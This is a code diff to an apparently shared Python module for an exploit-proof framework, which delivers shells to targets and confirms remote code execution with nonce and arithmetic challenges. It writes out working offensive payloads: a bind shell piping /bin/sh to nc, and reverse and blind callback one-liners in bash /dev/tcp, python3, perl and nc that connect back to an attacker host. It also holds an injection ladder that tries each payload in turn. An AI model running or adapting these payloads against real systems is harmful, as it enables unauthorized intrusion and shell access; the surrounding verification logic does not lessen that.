@@ -4,15 +4,25 @@ Target-agnostic shell delivery + challenge-response (nonce) proof, shared by eve
 PoC under pocs/. Stdlib-socket only — runs unchanged in python:3.12-slim.
 
 Trust model: the MODEL is untrusted, the PoC CODE is trusted (we wrote+tested it), the
-TARGET is untrusted. A per-attempt nonce (minted by the orchestrator, injected as
-HALO_NONCE) is echoed back by the target; only a matching echo proves *our* command ran
-on *this* target — a tarpit streaming `uid=0(root)` cannot forge it.
+TARGET is untrusted. Proof is execution-derived, not literal-echo: the shell must return
+a value it can only produce by RUNNING our command (the substituted `$(id -u)` marker, or
+a computed `a+b` on the blind rung). A tarpit streaming `uid=0(root)`, or a reflector that
+echoes our bytes verbatim, returns the literal recipe and is rejected.
+
+Residual limit: this proves a shell RAN our command, which reflection cannot forge. It
+does NOT defeat a genuine command-forwarding relay — a target that actually forwards our
+command to a real shell elsewhere and runs it. There, our code did execute, just not
+necessarily on the named host; evidence_meta's peer address is the only mitigating signal,
+not a guarantee.
 """
 from __future__ import annotations
 
+import hashlib
 import os
+import random
 import re
 import socket
+import time
 from dataclasses import dataclass
 
 _EVIDENCE_PREFIX = "HALO-EVIDENCE"
@@ -23,23 +33,134 @@ def make_nonce() -> str:
     return os.urandom(12).hex()
 
 
+def _rand_operand() -> int:
+    """A per-attempt integer the target must ADD — forcing computation, not echo."""
+    return random.randint(1000, 9_999_999)
+
+
+def payload_fingerprint(payload: str) -> str:
+    """Short stable hash of a payload, for binding a challenge to what we sent."""
+    return hashlib.sha256(payload.encode()).hexdigest()[:16]
+
+
+@dataclass(frozen=True)
+class Challenge:
+    """A per-attempt proof challenge. `nonce` gives freshness; `a`,`b` force the target
+    to COMPUTE (sum) rather than echo; the binding fields tie the answer to THIS attempt,
+    target, payload and channel; `expiry` is a time.monotonic() deadline (0 => none)."""
+    nonce: str
+    a: int
+    b: int
+    target: str = ""
+    attempt_id: str = ""
+    payload_hash: str = ""
+    expected_channel: str = ""
+    expiry: float = 0.0
+
+    @property
+    def expected_sum(self) -> int:
+        return self.a + self.b
+
+    def expired(self, _now: float | None = None) -> bool:
+        if not self.expiry:
+            return False
+        now = time.monotonic() if _now is None else _now
+        return now > self.expiry
+
+    def matches(self, *, target: str | None = None, channel: str | None = None) -> bool:
+        if target is not None and self.target and target != self.target:
+            return False
+        if channel is not None and self.expected_channel and channel != self.expected_channel:
+            return False
+        return True
+
+    @classmethod
+    def ephemeral(cls, nonce: str) -> "Challenge":
+        """Unbound single-use challenge for callers still passing a bare nonce string."""
+        return cls(nonce=nonce, a=_rand_operand(), b=_rand_operand())
+
+
+def mint_challenge(target: str = "", *, attempt_id: str = "", payload_hash: str = "",
+                   channel: str = "", ttl: float = 30.0) -> Challenge:
+    return Challenge(
+        nonce=make_nonce(), a=_rand_operand(), b=_rand_operand(),
+        target=target, attempt_id=attempt_id, payload_hash=payload_hash,
+        expected_channel=channel,
+        expiry=(time.monotonic() + ttl) if ttl else 0.0,
+    )
+
+
+class ChallengeRegistry:
+    """Process-local mint + consume-once. Rejects replayed and cross-attempt answers.
+
+    `mint` records each challenge by nonce so a later gate can look it up and enforce
+    binding + one-time use via `confirm_once` — the orchestrator-side companion to the
+    PoC's own execution proof."""
+
+    def __init__(self) -> None:
+        self._minted: dict[str, Challenge] = {}
+        self._consumed: set[str] = set()
+
+    def mint(self, target: str = "", **kw) -> Challenge:
+        ch = mint_challenge(target, **kw)
+        self._minted[ch.nonce] = ch
+        return ch
+
+    def get(self, nonce: str) -> Challenge | None:
+        return self._minted.get(nonce)
+
+    def consume(self, ch: Challenge) -> bool:
+        if ch.nonce in self._consumed:
+            return False
+        self._consumed.add(ch.nonce)
+        return True
+
+    def validate(self, ch: Challenge, *, target: str | None = None,
+                 channel: str | None = None) -> bool:
+        return (not ch.expired()
+                and ch.matches(target=target, channel=channel)
+                and ch.nonce not in self._consumed)
+
+    def confirm_once(self, nonce: str, *, target: str | None = None,
+                     channel: str | None = None) -> bool:
+        """One-shot gate for an evidence nonce: True only if THIS registry minted it,
+        it still validates (not expired, target/channel match, not yet consumed), and
+        we consume it now. A replayed or unknown nonce returns False."""
+        ch = self._minted.get(nonce)
+        if ch is None or not self.validate(ch, target=target, channel=channel):
+            return False
+        self._consumed.add(nonce)
+        return True
+
+
+def _sha256(b: bytes) -> str:
+    return hashlib.sha256(b).hexdigest()
+
+
 @dataclass(frozen=True)
 class Breach:
     confirmed: bool
-    level: str                 # "shell" | "blind-rce" | "none"
+    level: str                 # legacy alias: "shell" | "blind-rce" | "none"
     nonce: str
     proof: str
     uid: str | None = None
     host: str | None = None
     exit_code: str | None = None
+    evidence: str = "none"     # layered: "code-exec" | "uid-verified" | "interactive" | "none"
+    user: str | None = None
+    evidence_hash: str | None = None
+    evidence_meta: dict | None = None
 
     def __bool__(self) -> bool:
         return self.confirmed
 
     def __str__(self) -> str:
-        parts = [_EVIDENCE_PREFIX, f"nonce={self.nonce}", f"level={self.level}"]
+        parts = [_EVIDENCE_PREFIX, f"nonce={self.nonce}", f"level={self.level}",
+                 f"evidence={self.evidence}"]
         if self.uid is not None:
             parts.append(f"uid={self.uid}")
+        if self.user is not None:
+            parts.append(f"user={self.user}")
         if self.host is not None:
             parts.append(f"host={self.host}")
         if self.exit_code is not None:
@@ -90,16 +211,31 @@ def _drain(sock: socket.socket, timeout: float) -> bytes:
     return b"".join(chunks)
 
 
-def confirm_shell(sock: socket.socket, *, service: str = "", nonce: str = "",
-                  timeout: float = 8.0) -> Breach:
-    """Probe an already-open shell socket with a challenge-response marker.
+def _proof_probe(nonce: str) -> bytes:
+    """Ask the shell to COMPUTE `$(id -u)`/`$(id -un)` around the nonce. A reflector
+    returns the literal `$( ... )` recipe and cannot satisfy the substituted marker."""
+    return f"echo {nonce}.$(id -u).$(id -un); uname -n\n".encode()
 
-    Confirmed only when the target echoes `<nonce>-MARK` — proves *our* command ran,
-    so a banner/tarpit that streams `uid=0` without the nonce is NOT a breach."""
-    nonce = nonce or make_nonce()
-    mark = f"{nonce}-MARK"
+
+def _marker_re(nonce: str):
+    return re.compile(re.escape(nonce) + r"\.(?P<uid>\d+)\.(?P<user>[A-Za-z0-9._-]+)")
+
+
+def confirm_shell(sock: socket.socket, *, service: str = "", nonce: str = "",
+                  challenge=None, timeout: float = 8.0) -> Breach:
+    """Probe an already-open shell socket with an execution-derived challenge.
+
+    Confirmed only when the target returns the SUBSTITUTED marker `<nonce>.<uid>.<user>`
+    — proving a shell ran our command. A banner/tarpit/reflector that echoes our bytes
+    returns the literal `$(id -u)` recipe and is rejected."""
+    ch = challenge if isinstance(challenge, Challenge) else Challenge.ephemeral(nonce or make_nonce())
+    nonce = ch.nonce
     try:
-        sock.sendall(f"echo {mark}; id; uname -n\n".encode())
+        peer = sock.getpeername()[0]
+    except (OSError, IndexError):
+        peer = None
+    try:
+        sock.sendall(_proof_probe(nonce))
         out = _drain(sock, timeout)
     except OSError:
         out = b""
@@ -109,18 +245,28 @@ def confirm_shell(sock: socket.socket, *, service: str = "", nonce: str = "",
         except OSError:
             pass
     text = out.decode("utf-8", "replace")
-    if mark not in text:
-        return Breach(confirmed=False, level="none", nonce=nonce, proof=text)
-    m = _UID_RE.search(text)
-    uid = m.group(1) if m else None
+    meta = {"peer": peer, "ts": time.time(), "channel": "interactive"}
+    ehash = _sha256(out)
+    # Reflection guard: the literal recipe means nothing executed.
+    if f"{nonce}.$(" in text:
+        return Breach(confirmed=False, level="none", evidence="none", nonce=nonce,
+                      proof=text, evidence_hash=ehash, evidence_meta=meta)
+    m = _marker_re(nonce).search(text)
+    # Require the marker to be line-terminated: a truncated read (cut mid-user, no
+    # trailing newline) is NOT a complete, executed marker and must be rejected.
+    if not m or not text[m.end():m.end() + 1].isspace():
+        return Breach(confirmed=False, level="none", evidence="none", nonce=nonce,
+                      proof=text, evidence_hash=ehash, evidence_meta=meta)
+    uid, user = m.group("uid"), m.group("user")
     host = None
     for line in text.splitlines():
-        line = line.strip()
-        if line and line != mark and not line.startswith("uid=") and " " not in line:
-            host = line
+        s = line.strip()
+        if s and not _marker_re(nonce).search(s):
+            host = s
             break
-    return Breach(confirmed=True, level="shell", nonce=nonce, proof=text.strip(),
-                  uid=uid, host=host, exit_code="0")
+    return Breach(confirmed=True, level="shell", evidence="interactive", nonce=nonce,
+                  proof=text.strip(), uid=uid, user=user, host=host, exit_code="0",
+                  evidence_hash=ehash, evidence_meta=meta)
 
 
 def _first_available(*variants: str) -> str:
@@ -161,17 +307,22 @@ def bind_payload(bind_port: int, nonce: str) -> str:
             f"cat {fifo} | /bin/sh -i 2>&1 | nc -l -p {bind_port} > {fifo} &")
 
 
-def blind_callback_payload(lhost: str, lport: int, nonce: str) -> str:
-    """Connect back and send ONLY the nonce — proves code ran without a shell channel."""
+def blind_callback_payload(lhost: str, lport: int, challenge) -> str:
+    """Connect back and send `<nonce>:<a+b>` — the target must COMPUTE the sum, so a
+    reflector echoing the payload (literal `$(( a + b ))`) cannot forge the answer."""
+    ch = challenge if isinstance(challenge, Challenge) else Challenge.ephemeral(str(challenge))
     _require_safe("lhost", lhost)
-    _require_safe("nonce", nonce)
+    _require_safe("nonce", ch.nonce)
     lport = int(lport)
-    bash = f"bash -c 'exec 3<>/dev/tcp/{lhost}/{lport}; echo {nonce}-MARK >&3'"
+    a, b = ch.a, ch.b
+    ans = f"{ch.nonce}:$(( {a} + {b} ))"                 # sh/bash/nc compute this
+    bash = f"bash -c 'exec 3<>/dev/tcp/{lhost}/{lport}; echo {ans} >&3'"
     py = (f"python3 -c 'import socket;s=socket.socket();"
-          f"s.connect((\"{lhost}\",{lport}));s.sendall(b\"{nonce}-MARK\")'")
+          f"s.connect((\"{lhost}\",{lport}));s.sendall(b\"{ch.nonce}:%d\"%({a}+{b}))'")
     perl = (f"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
-            f"connect(S,sockaddr_in({lport},inet_aton(\"{lhost}\")));send(S,\"{nonce}-MARK\",0);'")
-    nc = f"echo {nonce}-MARK | nc {lhost} {lport}"
+            f"connect(S,sockaddr_in({lport},inet_aton(\"{lhost}\")));"
+            f"$s={a}+{b};send(S,\"{ch.nonce}:$s\",0);'")
+    nc = f"echo {ans} | nc {lhost} {lport}"
     return _first_available(("bash", bash), ("python3", py), ("perl", perl), ("nc", nc))
 
 
@@ -207,7 +358,8 @@ class _Listener:
         except OSError:
             return None
 
-    def wait_for_nonce(self, nonce: str) -> bool:
+    def wait_for_answer(self, challenge) -> bool:
+        ch = challenge if isinstance(challenge, Challenge) else Challenge.ephemeral(str(challenge))
         conn = self.accept_one()
         if conn is None:
             return False
@@ -215,23 +367,26 @@ class _Listener:
             data = _drain(conn, self._timeout)
         finally:
             conn.close()
-        return f"{nonce}-MARK".encode() in data
-
-
-import time
+        self.last_raw = data
+        return f"{ch.nonce}:{ch.expected_sum}".encode() in data
 
 
 def establish_rce(inject, target: str, *, service: str = "", nonce: str = "",
-                  bind_port: int = 45444, ladder_timeout: float = 8.0,
+                  challenge=None, bind_port: int = 45444, ladder_timeout: float = 8.0,
                   _ip: str | None = None) -> Breach:
     """Given a blind single-command `inject`, walk the delivery ladder until a breach.
 
-    Rung 1 reverse shell → Rung 2 bind shell → Rung 3 blind nonce callback. Returns the
-    first confirmed Breach; never raises for a non-breach."""
-    nonce = nonce or make_nonce()
+    Rung 1 reverse shell → Rung 2 bind shell → Rung 3 blind arithmetic callback. Each
+    rung proves execution (substitution or computed sum), not reflection. Returns the
+    first confirmed Breach; never raises for a non-breach.
+
+    LIMIT: a genuine command-forwarding relay would pass — our code ran, just perhaps not
+    on the named host. That is out of scope; `evidence_meta['peer']` is the only signal."""
+    ch = challenge if isinstance(challenge, Challenge) else Challenge.ephemeral(nonce or make_nonce())
+    nonce = ch.nonce
     lhost = _ip or local_ip_for(target)
 
-    # Rung 1: reverse shell — listener accepts the callback, confirm_shell probes it.
+    # Rung 1: reverse shell — accept the callback, then prove with a substitution probe.
     with _Listener(timeout=ladder_timeout) as lis:
         try:
             inject(reverse_payload(lhost, lis.port, nonce))
@@ -239,11 +394,11 @@ def establish_rce(inject, target: str, *, service: str = "", nonce: str = "",
             pass
         conn = lis.accept_one()
         if conn is not None:
-            br = confirm_shell(conn, service=service, nonce=nonce, timeout=ladder_timeout)
+            br = confirm_shell(conn, service=service, challenge=ch, timeout=ladder_timeout)
             if br:
                 return br
 
-    # Rung 2: bind shell — target binds /bin/sh; we connect out and probe.
+    # Rung 2: bind shell — connect out and prove with the same substitution probe.
     try:
         inject(bind_payload(bind_port, nonce))
     except Exception:
@@ -255,19 +410,23 @@ def establish_rce(inject, target: str, *, service: str = "", nonce: str = "",
         except OSError:
             time.sleep(0.4)
             continue
-        br = confirm_shell(sock, service=service, nonce=nonce, timeout=ladder_timeout)
+        br = confirm_shell(sock, service=service, challenge=ch, timeout=ladder_timeout)
         if br:
             return br
         break
 
-    # Rung 3: blind nonce callback — prove exec even with no usable shell.
+    # Rung 3: blind arithmetic callback — prove exec even with no usable shell.
     with _Listener(timeout=ladder_timeout) as lis:
         try:
-            inject(blind_callback_payload(lhost, lis.port, nonce))
+            inject(blind_callback_payload(lhost, lis.port, ch))
         except Exception:
             pass
-        if lis.wait_for_nonce(nonce):
-            return Breach(confirmed=True, level="blind-rce", nonce=nonce,
-                          proof=f"{nonce}-MARK received out-of-band", exit_code="0")
+        if lis.wait_for_answer(ch):
+            return Breach(confirmed=True, level="blind-rce", evidence="code-exec",
+                          nonce=nonce,
+                          proof=f"{nonce}:{ch.expected_sum} computed and received out-of-band",
+                          evidence_hash=_sha256(getattr(lis, "last_raw", b"")),
+                          evidence_meta={"channel": "blind-callback", "ts": time.time()},
+                          exit_code="0")
 
-    return Breach(confirmed=False, level="none", nonce=nonce, proof="")
+    return Breach(confirmed=False, level="none", evidence="none", nonce=nonce, proof="")
